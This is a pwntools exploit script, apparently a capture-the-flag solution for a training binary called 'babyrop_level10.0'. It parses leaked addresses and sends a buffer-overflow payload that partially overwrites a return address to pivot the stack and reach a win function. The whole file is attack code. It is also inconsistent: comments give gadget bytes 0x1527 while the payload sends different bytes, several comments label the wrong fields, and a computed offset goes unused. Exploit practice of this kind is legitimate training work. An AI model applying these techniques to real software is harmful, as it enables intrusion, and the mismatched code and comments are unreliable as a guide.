from pwn import *
import time 

binary = './babyrop_level10.0'
elf = ELF(binary)

context.binary = binary
p = process(binary)

# Parse leaks
p.recvuntil(b"That pointer is stored at ")
win_ptr_addr = int(p.recvuntil(b",", drop=True), 16)
print(f"[+] Win function pointer is at: {hex(win_ptr_addr)}")

p.recvuntil(b"Your input buffer is located at: ")
buffer_addr = int(p.recvuntil(b".\n\n", drop=True), 16)
print(f"[+] Input buffer is at: {hex(buffer_addr)}")

p.recvuntil(b"The win function has just been dynamically constructed at ")
win_func_addr = int(p.recvuntil(b".\n", drop=True), 16)
print(f"[+] Win function is at: {hex(win_func_addr)}")

# Calculate the offset from buffer to return address
# The return address is at rp_ which is in register0x00000020 (RBP+8)
# We're overflowing local_80
offset = 0x80  # Size of local_80 from the assembly code

# For partial overwrite, we'll use a stack pivot gadget
# The gadget address changes with each run due to PIE
# But the least significant bytes often stay the same
pop_rsp_pop_r13_pop_rbp_ret = 0x1527  # Last 2 bytes only (partial address)

# We'll write gdb commands to help us debug
s = '''
b *challenge+702
'''
gdb.attach(p, s)

# Our payload needs to:
# 1. Fill the buffer up to the return address
# 2. Perform a partial overwrite of the return address to hit our pivot gadget
# 3. Place the address where the win_ptr is stored so that RSP points to it after the pivot

# For partial overwrite, we only need the last 2 bytes (0x1527)
# This assumes the binary is loaded at an address where the upper bytes align with our gadget
payload = flat(
	win_func_addr,
	b'A'*0x70,
	win_ptr_addr,          # Padding to reach return address
	b'\x1e\x17', # Partial overwrite of return address (2 bytes only)                # After stack pivot, RSP will point here
)

p.send(payload)

p.interactive()
